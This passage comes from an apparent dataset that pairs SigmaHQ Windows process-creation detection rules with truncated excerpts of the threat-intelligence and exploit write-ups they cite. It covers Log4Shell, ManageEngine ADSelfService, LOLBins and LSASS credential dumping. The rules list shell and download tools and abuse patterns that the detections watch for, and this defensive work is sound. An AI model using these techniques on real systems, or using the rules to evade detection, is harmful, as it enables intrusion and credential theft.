          "Image|endswith": "\\ImagingDevices.exe"
        },
        "selection_child": {
          "ParentImage|endswith": "\\ImagingDevices.exe"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_imagingdevices_unusual_parents.yml"
  },
  "242": {
    "url": "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
    "markdown": "# MoonBounce: the dark side of UEFI firmware **APT reports** **20 Jan 2022** ## Table of Contents - What happened? - Revisiting the current state of the art in persistent attacks - Our discovery: a sophisticated implant within UEFI firmware - Other pieces of malware on the radar - Who were the targets? - What were the attackers trying to achieve? - Network infrastructure - Who is behind the MoonBounce attack? - Conclusion - MoonBounce indicators of compromise ## What happened? At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware",
    "sigma_rule": {
      "title": "Suspicious Execution of InstallUtil Without Log",
      "id": "d042284c-a296-4988-9be5-f424fadcc28c",
      "status": "test",
      "description": "Uses the .NET InstallUtil.exe application in order to execute image without log",
      "references": [
        "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
        "https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool"
      ],
      "author": "frack113",
      "date": "2022-01-23",
      "modified": "2022-02-04",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\InstallUtil.exe",
          "Image|contains": "Microsoft.NET\\Framework",
          "CommandLine|contains|all": [
            "/logfile= ",
            "/LogToConsole=false"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_instalutil_no_log_execution.yml"
  },
  "243": {
    "url": "https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool",
    "markdown": "# Installutil.exe (Installer tool) The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. This tool works in conjunction with classes in the System.Configuration.Install namespace. This tool is automatically installed with Visual Studio. To run the tool, use Visual Studio Developer Command Prompt or Visual Studio Developer PowerShell. At the command prompt, type the following: ## Syntax ``` installutil [/u[ninstall]] [options] assembly [[options] assembly] ... ``` ## Parameters | Argument | Description | |-----------|-------------| | `assembly` | The file name of the assembly in which to",
    "sigma_rule": {
      "title": "Suspicious Execution of InstallUtil Without Log",
      "id": "d042284c-a296-4988-9be5-f424fadcc28c",
      "status": "test",
      "description": "Uses the .NET InstallUtil.exe application in order to execute image without log",
      "references": [
        "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
        "https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool"
      ],
      "author": "frack113",
      "date": "2022-01-23",
      "modified": "2022-02-04",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\InstallUtil.exe",
          "Image|contains": "Microsoft.NET\\Framework",
          "CommandLine|contains|all": [
            "/logfile= ",
            "/LogToConsole=false"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_instalutil_no_log_execution.yml"
  },
  "244": {
    "url": "https://redcanary.com/blog/intelligence-insights-december-2021",
    "markdown": "# Intelligence Insights: December 2021 **Qbot climbs in threat rankings, Emotet is back, and an ADSelfService Plus RCE vulnerability likely increased detections involving webshells.** *Originally published December 16, 2021. Last modified April 30, 2024.* --- *Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community.* ## Highlights **Editor’s note:** We realize much of the cybersecurity community is",
    "sigma_rule": {
      "title": "Suspicious Shells Spawn by Java Utility Keytool",
      "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
      "status": "test",
      "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-december-2021",
        "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-22",
      "modified": "2023-01-21",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\keytool.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\sh.exe",
            "\\bash.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\schtasks.exe",
            "\\certutil.exe",
            "\\whoami.exe",
            "\\bitsadmin.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\scrcons.exe",
            "\\regsvr32.exe",
            "\\hh.exe",
            "\\wmic.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\forfiles.exe",
            "\\scriptrunner.exe",
            "\\mftrace.exe",
            "\\AppVLP.exe",
            "\\systeminfo.exe",
            "\\reg.exe",
            "\\query.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_keytool_susp_child_process.yml"
  },
  "245": {
    "url": "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html",
    "markdown": "# How to exploit CVE-2021-40539 on ManageEngine ADSelfService Plus 04/11/2021 Categories: Exploit, Pentest ## Introduction During a penetration test we encountered the ManageEngine ADSelfService Plus (ADSS) solution. ADSS offers multiple functionalities such as managing password policies for administrators or self password reset/account unlock for Active Directory users. We decided to dig into this solution. However, our research barely started that a wild exploitation on this solution was announced. In this article we will explore the details of several vulnerabilities that allow an unauthenticated attacker to execute arbitrary code on the server. ## First steps ADSelfService Plus from ManageEngine was reported",
    "sigma_rule": {
      "title": "Suspicious Shells Spawn by Java Utility Keytool",
      "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
      "status": "test",
      "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-december-2021",
        "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-22",
      "modified": "2023-01-21",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\keytool.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\sh.exe",
            "\\bash.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\schtasks.exe",
            "\\certutil.exe",
            "\\whoami.exe",
            "\\bitsadmin.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\scrcons.exe",
            "\\regsvr32.exe",
            "\\hh.exe",
            "\\wmic.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\forfiles.exe",
            "\\scriptrunner.exe",
            "\\mftrace.exe",
            "\\AppVLP.exe",
            "\\systeminfo.exe",
            "\\reg.exe",
            "\\query.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_keytool_susp_child_process.yml"
  },
  "246": {
    "url": "https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/",
    "markdown": "# Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package **December 9, 2021** *Originally Posted @ December 9th & Last Updated @ August 1st, 3:30pm PDT* **Fixing Log4Shell? Claim a free vulnerability scan on our dedicated security platform and generate a detailed report in minutes.** ## What is it? On Thursday, December 9th a 0-day exploit in the popular Java logging library log4j (version 2), called Log4Shell, was discovered that results in Remote Code Execution (RCE) simply by logging a certain string. Given how ubiquitous this library is, the severity of the exploit (full server control), and",
    "sigma_rule": {
      "title": "Suspicious Processes Spawned by Java.EXE",
      "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
      "related": [
        {
          "id": "dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j)",
      "references": [
        "https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/"
      ],
      "author": "Andreas Hunkeler (@Karneades), Florian Roth",
      "date": "2021-12-17",
      "modified": "2024-01-18",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\java.exe",
          "Image|endswith": [
            "\\AppVLP.exe",
            "\\bitsadmin.exe",
            "\\certutil.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\forfiles.exe",
            "\\hh.exe",
            "\\mftrace.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\query.exe",
            "\\reg.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\schtasks.exe",
            "\\scrcons.exe",
            "\\scriptrunner.exe",
            "\\sh.exe",
            "\\systeminfo.exe",
            "\\whoami.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate calls to system binaries",
        "Company specific internal usage"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_susp_child_process.yml"
  },
  "247": {
    "url": "https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/",
    "markdown": "# Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package **December 9, 2021** *Originally Posted @ December 9th & Last Updated @ August 1st, 3:30pm PDT* **Fixing Log4Shell? Claim a free vulnerability scan on our dedicated security platform and generate a detailed report in minutes.** ## What is it? On Thursday, December 9th a 0-day exploit in the popular Java logging library log4j (version 2), called Log4Shell, was discovered that results in Remote Code Execution (RCE) simply by logging a certain string. Given how ubiquitous this library is, the severity of the exploit (full server control), and",
    "sigma_rule": {
      "title": "Shell Process Spawned by Java.EXE",
      "id": "dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0",
      "related": [
        {
          "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation)",
      "references": [
        "https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/"
      ],
      "author": "Andreas Hunkeler (@Karneades), Nasreddine Bencherchali",
      "date": "2021-12-17",
      "modified": "2024-01-18",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\java.exe",
          "Image|endswith": [
            "\\bash.exe",
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe"
          ]
        },
        "filter_main_build": {
          "ParentImage|contains": "build",
          "CommandLine|contains": "build"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate calls to system binaries",
        "Company specific internal usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_susp_child_process_2.yml"
  },
  "248": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/",
    "markdown": "# MERCURY leveraging Log4j 2 vulnerabilities in unpatched systems to target Israeli organizations **Published**: August 25, 2022 ## April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **MERCURY** is now tracked as **Mango Sandstorm**. To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. --- In recent weeks, the Microsoft Threat Intelligence Center (MSTIC) and Microsoft 365 Defender Research",
    "sigma_rule": {
      "title": "Suspicious SysAidServer Child",
      "id": "60bfeac3-0d35-4302-8efb-1dd16f715bc6",
      "status": "test",
      "description": "Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-26",
      "tags": [
        "attack.lateral-movement",
        "attack.t1210"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\java.exe",
            "\\javaw.exe"
          ],
          "ParentCommandLine|contains": "SysAidServer"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_sysaidserver_susp_child_process.yml"
  },
  "249": {
    "url": "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
    "markdown": "# Living off the land *April 25, 2021* > **Note** > 🍄Interested in leveling up your **Windows & AD Pentesting** skills? Checkout our Udemy course and get **Free 7-day** lab access with proof of purchase! This post will run through a scenario showcasing multiple methods of living off the land with built-in Windows assemblies (aka LOLBins). This scenario takes place on TheSprawl, one of our pentesting ranges. The lab scenario simply functions to emulate **exfil and lateral movement** utilizing built-in Windows tools. At the end we’ll briefly run through some artifacts and logs. Keep in mind these methods may not",
    "sigma_rule": {
      "title": "Potential Reconnaissance Activity Via GatherNetworkInfo.VBS",
      "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
      "related": [
        {
          "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
          "type": "similar"
        },
        {
          "id": "07aa184a-870d-413d-893a-157f317f6f58",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "blueteamer8699",
      "date": "2022-01-03",
      "modified": "2023-02-08",
      "tags": [
        "attack.discovery",
        "attack.execution",
        "attack.t1615",
        "attack.t1059.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "cscript.exe",
              "wscript.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "gatherNetworkInfo.vbs"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lolbin_gather_network_info.yml"
  },
  "250": {
    "url": "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government",
    "markdown": "# Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government **Published on:** December 15, 2022 **Tags:** Threat Intelligence --- ## Executive Summary - Mandiant identified an operation focused on the Ukrainian government via trojanized Windows 10 Operating System installers. These were distributed via torrent sites in a supply chain attack. - Threat activity tracked as UNC4166 likely trojanized and distributed malicious Windows Operating system installers which drop malware that conducts reconnaissance and deploys additional capability on some victims to conduct data theft. - The trojanized files use the Ukrainian language pack and are designed to target Ukrainian users. Following compromise,",
    "sigma_rule": {
      "title": "Potential Reconnaissance Activity Via GatherNetworkInfo.VBS",
      "id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
      "related": [
        {
          "id": "f92a6f1e-a512-4a15-9735-da09e78d7273",
          "type": "similar"
        },
        {
          "id": "07aa184a-870d-413d-893a-157f317f6f58",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
      "references": [
        "https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs",
        "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
      ],
      "author": "blueteamer8699",
      "date": "2022-01-03",
      "modified": "2023-02-08",
      "tags": [
        "attack.discovery",
        "attack.execution",
        "attack.t1615",
        "attack.t1059.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "cscript.exe",
              "wscript.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "gatherNetworkInfo.vbs"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lolbin_gather_network_info.yml"
  },
  "251": {
    "url": "https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin",
    "markdown": "# SettingSyncHost.exe as a LolBin Posted on 2020-02-02 This native OS binary has two interesting options: - `-LoadAndRunDiagScript <name>` - `-LoadAndRunDiagScriptNoCab <name>` When executed with these options, it will extract the `.bat` file stored inside its resources, save it as `%TEMP%\\RoamDiag.cmd`, and then it will execute it. There are at least two ways we can exploit it. We can create our own `%TEMP%\\RoamDiag.cmd` and make the `SettingSyncHost.exe` execute it, but there is a caveat. The `.cmd` file is always deleted and issues with that will stop the program from working. Still, we could try a race condition approach i.e. run",
    "sigma_rule": {
      "title": "Using SettingSyncHost.exe as LOLBin",
      "id": "b2ddd389-f676-4ac4-845a-e00781a48e5f",
      "status": "test",
      "description": "Detects using SettingSyncHost.exe to run hijacked binary",
      "references": [
        "https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin"
      ],
      "author": "Anton Kutepov, oscd.community",
      "date": "2020-02-05",
      "modified": "2021-11-27",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1574.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "system_utility": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\"
          ]
        },
        "parent_is_settingsynchost": {
          "ParentCommandLine|contains|all": [
            "cmd.exe /c",
            "RoamDiag.cmd",
            "-outputpath"
          ]
        },
        "condition": "not system_utility and parent_is_settingsynchost"
      },
      "fields": [
        "TargetFilename",
        "Image"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lolbin_settingsynchost.yml"
  },
  "252": {
    "url": "https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/",
    "markdown": "# Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start ## Intro Recently, I became rather intrigued after reading this article from MSTIC about how Windows Defender Advanced Threat Protection (WDATP) is supposed to detect credential dumping by statistically probing the amount of data read from the LSASS process. A little background is first necessary, though: on a host guarded by WDATP, when a standard credential-dumper such as mimikatz is executed, it should trigger an alert like the following one. ```image Alt: This is sample image Description: The image displays an alert notification from a cybersecurity platform regarding a",
    "sigma_rule": {
      "title": "Potential Credential Dumping Via LSASS Process Clone",
      "id": "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
      "status": "test",
      "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity",
      "references": [
        "https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/",
        "https://web.archive.org/web/20211128075033/https://twitter.com/Hexacorn/status/1420053502554951689",
        "https://twitter.com/SBousseaden/status/1464566846594691073?s=20"
      ],
      "author": "Florian Roth (Nextron Systems), Samir Bousseaden",
      "date": "2021-11-27",
      "modified": "2023-03-02",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\Windows\\System32\\lsass.exe",
          "Image|endswith": "\\Windows\\System32\\lsass.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lsass_process_clone.yml"
  },
  "253": {
    "url": "https://web.archive.org/web/20211128075033/https://twitter.com/Hexacorn/status/1420053502554951689",
    "markdown": "# Comment Jul 27, 2021 So, back to the initial question - which mechanism is used by Windows eventlog service for EID 4688 registration? ## Comment Jul 27, 2021 I guess it's PspInsertProcess -> SeAuditProcessCreation ... -> 4688 and... PspInsertProcess is called before PspInsertThread inside NtCreateUserProcess ### Comment Jul 27, 2021 PspInsertProcess.asm ```image Description: The image displays a snippet of assembly code, likely extracted from a security analysis or malware reverse engineering context. It includes hexadecimal addresses, assembly instructions (like 'mov' and 'call'), and references to specific functions such as 'SeAuditProcessCreation'. The code appears to be part of a process",
    "sigma_rule": {
      "title": "Potential Credential Dumping Via LSASS Process Clone",
      "id": "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
      "status": "test",
      "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity",
      "references": [
        "https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/",
        "https://web.archive.org/web/20211128075033/https://twitter.com/Hexacorn/status/1420053502554951689",
        "https://twitter.com/SBousseaden/status/1464566846594691073?s=20"
      ],
      "author": "Florian Roth (Nextron Systems), Samir Bousseaden",
      "date": "2021-11-27",
      "modified": "2023-03-02",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\Windows\\System32\\lsass.exe",
          "Image|endswith": "\\Windows\\System32\\lsass.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lsass_process_clone.yml"
  },
  "254": {
    "url": "https://twitter.com/SBousseaden/status/1464566846594691073?s=20",
    "markdown": "# Post Nov 27, 2021 just added a detection for creating an LSASS clone to dump memory or alike using event 4688, more details in the PR: https://github.com/elastic/detection-rules/pull/1632 ```image Description: The image displays a code snippet related to Elastic Query Language (EQL) used for searching logs. It includes a query to detect processes related to the Windows LSASS (Local Security Authority Subsystem Service) executable, specifically looking for event code 4688. The left side shows the query parameters and structure, while the right side presents a JSON-like response detailing the process information, including the executable name, process ID, and other attributes.",
    "sigma_rule": {
      "title": "Potential Credential Dumping Via LSASS Process Clone",
      "id": "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
      "status": "test",
      "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity",
      "references": [
        "https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/",
        "https://web.archive.org/web/20211128075033/https://twitter.com/Hexacorn/status/1420053502554951689",
        "https://twitter.com/SBousseaden/status/1464566846594691073?s=20"
      ],
      "author": "Florian Roth (Nextron Systems), Samir Bousseaden",
      "date": "2021-11-27",
      "modified": "2023-03-02",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\Windows\\System32\\lsass.exe",
          "Image|endswith": "\\Windows\\System32\\lsass.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_lsass_process_clone.yml"
  },
  "255": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml"
  },
  "256": {
    "url": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
    "markdown": "# The-DFIR-Report / Sigma-Rules / win_mofcomp_execution.yml title: MOFComp Execution id: fd7aed23-7585-44fb-9920-5da82c740e6e status: Experimental description: Detects abuse of mofcomp to load WMI classes i.e. to create WMI event subscriptions author: _pete_0, TheDFIRReport references: - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/ date: 2022/07/11 modified: 2022/07/11 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\\mofcomp.exe' ParentImage|endswith: - '\\cmd.exe' - '\\powershell.exe' condition: selection fields: - ParentCommandLine falsepositives: - System administrator activities level: high tags: - attack.execution - attack.t1546.003",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
